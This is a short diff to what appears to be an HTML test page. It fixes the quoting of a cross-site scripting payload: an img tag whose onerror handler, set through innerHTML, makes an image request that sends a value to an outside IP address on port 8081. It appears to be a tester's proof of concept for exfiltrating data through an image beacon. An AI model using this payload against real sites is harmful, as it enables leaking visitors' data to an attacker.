@@ -431,8 +431,8 @@
 <!--</script>-->
 <script>
 // var str = "<div></div>";
-var str = "<img src=x onerror=console.log('injecting');b=document.createElement(\"img\");m=\"abc\";"+
-    "console.log(\"ZX\"+m);b.src=\"http://23.83.235.55:8081/\"+m;>";
+var str = "<img src=x onerror='console.log(\"injecting\");b=document.createElement(\"img\");m=\"abc\";"+
+    "console.log(\"ZX\"+m);b.src=\"http://23.83.235.55:8081/\"+m;'>";
 document.getElementById('inner').innerHTML = str;
 </script>
 <!--<script>-->
